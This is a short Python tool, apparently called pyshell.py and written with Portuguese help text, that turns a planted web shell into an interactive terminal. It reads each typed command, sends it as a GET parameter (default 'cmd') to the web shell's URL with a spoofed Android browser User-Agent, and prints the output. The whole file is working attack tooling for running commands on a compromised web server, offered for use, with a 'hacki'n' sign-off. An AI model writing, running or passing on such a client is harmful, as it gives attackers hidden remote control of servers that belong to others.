import requests
import argparse


parser = argparse.ArgumentParser(
                    prog = 'python3 pyshell.py',
                    description = 'Traz o Webshell para dentro do terminal.',
                    epilog = 'Have a good hacki\'n day!')

parser.add_argument('-u', required = True, help = 'O endereço do Webshell. Ex. https://localhost/cmd.php', metavar = ('URL'))
parser.add_argument('-p', help = 'O parâmetro da URL que executa os comandos. Ex. \'cmd\' (Padrão)', metavar = ('PARÂMETRO'), default='cmd')

args = parser.parse_args()

url = ((args.u) + '?')
parametro = args.p

while True:
	cmd = input("> ")
	payload = {(parametro):(cmd)}
	headers = {
		'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; RedMi Note 5 Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36'
	}

	r = requests.get((url), params=payload, headers=headers)
	
	print (r.text)

